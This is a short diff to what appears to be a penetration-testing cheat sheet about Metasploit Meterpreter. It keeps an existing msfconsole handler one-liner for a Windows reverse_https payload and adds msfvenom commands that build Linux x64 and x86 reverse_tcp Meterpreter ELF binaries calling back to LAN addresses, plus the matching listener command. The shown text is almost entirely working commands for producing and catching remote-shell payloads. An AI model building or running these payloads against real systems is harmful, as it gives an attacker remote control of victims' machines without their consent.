@@ -73,5 +73,10 @@ https://docs.rapid7.com/metasploit/use-meterpreter-locally-without-an-exploit/
 
 > `msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set ExitOnSession false;set ExitFunc thread;set LHOST 192.168.0.100;set LPORT 4444;run"`  
 
+> msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f elf -o _mtr100t_x64.elf  
+> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.120 LPORT=4444 -f elf -o _mtr120t_x86.elf  
+
+> `msfconsole -q -x "use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set ExitOnSession false; set LHOST 192.168.0.100;set LPORT 4444;run"`  
+
 ---
   
